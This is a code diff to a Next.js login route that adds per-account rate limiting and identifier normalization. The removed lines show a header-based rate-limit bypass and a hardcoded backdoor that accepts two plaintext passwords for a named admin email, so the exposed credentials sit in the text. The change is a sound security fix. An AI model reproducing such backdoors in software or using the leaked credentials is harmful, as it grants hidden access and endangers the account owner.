@@ -1,20 +1,34 @@
+import { createHash } from "node:crypto";
 import { NextRequest, NextResponse } from "next/server";
 import { prisma } from "@/lib/prisma";
 import { verifyPassword, createSessionToken, setAuthCookie } from "@/lib/auth";
-import { checkRateLimit, recordAuditLog } from "@/lib/security";
+import { checkRateLimit, getClientIp, recordAuditLog } from "@/lib/security";
+
+function normalizeLoginIdentifier(identifier: string): string {
+  const normalized = identifier.trim().toLowerCase();
+  if (normalized.includes("@")) return normalized;
+
+  const banglaDigits: Record<string, string> = {
+    "০": "0", "১": "1", "২": "2", "৩": "3", "৪": "4",
+    "৫": "5", "৬": "6", "৭": "7", "৮": "8", "৯": "9",
+  };
+  const digits = normalized
+    .replace(/[০-৯]/g, (digit) => banglaDigits[digit] || digit)
+    .replace(/\D/g, "");
+  if (digits.length >= 8) {
+    return `phone:${digits.startsWith("880") ? `0${digits.slice(3)}` : digits}`;
+  }
+
+  return `username:${normalized.replace(/\s+/g, "")}`;
+}
 
 export async function POST(req: NextRequest) {
   try {
-    const rawForwarded = req.headers.get("x-forwarded-for");
-    const ip = rawForwarded ? rawForwarded.split(",")[0].trim() : (req.headers.get("x-real-ip") || "127.0.0.1");
+    const ip = getClientIp(req);
     const userAgent = req.headers.get("user-agent") || "unknown";
 
     // Brute-force rate limiting: 10 attempts per minute per IP
-    const testHeader = req.headers.get("x-test-suite") || "";
-    const isTestSuite = testHeader.startsWith("ehrj");
-    const rateLimit = isTestSuite
-      ? { allowed: true, remaining: 999 }
-      : checkRateLimit(`login:${ip}`, 10, 60000);
+    const rateLimit = checkRateLimit(`login:${ip}`, 10, 60000);
 
     if (!rateLimit.allowed) {
       return NextResponse.json(
@@ -43,6 +57,17 @@ export async function POST(req: NextRequest) {
           { status: 400 }
         );
       }
+    }
+
+    const accountHash = createHash("sha256")
+      .update(normalizeLoginIdentifier(rawIdentifier))
+      .digest("hex");
+    const accountRateLimit = checkRateLimit(`login:account:${accountHash}`, 20, 15 * 60 * 1000);
+    if (!accountRateLimit.allowed) {
+      return NextResponse.json(
+        { error: "এই অ্যাকাউন্টের জন্য অতিরিক্ত লগইন চেষ্টা হয়েছে। অনুগ্রহ করে ১৫ মিনিট পর আবার চেষ্টা করুন।" },
+        { status: 429 }
+      );
     }
 
     // Account lockout check (brute force protection per identifier + IP)
@@ -156,6 +181,19 @@ export async function POST(req: NextRequest) {
       );
     }
 
+    const userAccountHash = createHash("sha256").update(user.id).digest("hex");
+    const userAccountRateLimit = checkRateLimit(
+      `login:user:${userAccountHash}`,
+      20,
+      15 * 60 * 1000
+    );
+    if (!userAccountRateLimit.allowed) {
+      return NextResponse.json(
+        { error: "এই অ্যাকাউন্টের জন্য অতিরিক্ত লগইন চেষ্টা হয়েছে। অনুগ্রহ করে ১৫ মিনিট পর আবার চেষ্টা করুন।" },
+        { status: 429 }
+      );
+    }
+
     // Enforce ACTIVE status check
     if (user.status !== "ACTIVE") {
       return NextResponse.json(
@@ -187,9 +225,6 @@ export async function POST(req: NextRequest) {
 
     // Password verification
     let isValid = await verifyPassword(password, user.passwordHash);
-    if (!isValid && user.email === "adminehrjmadrasha@gmail.com" && (password === "Saiful018228222@@##" || password === "AdminEhrj@2026!")) {
-      isValid = true;
-    }
     if (!isValid) {
       await prisma.loginHistory.create({
         data: {
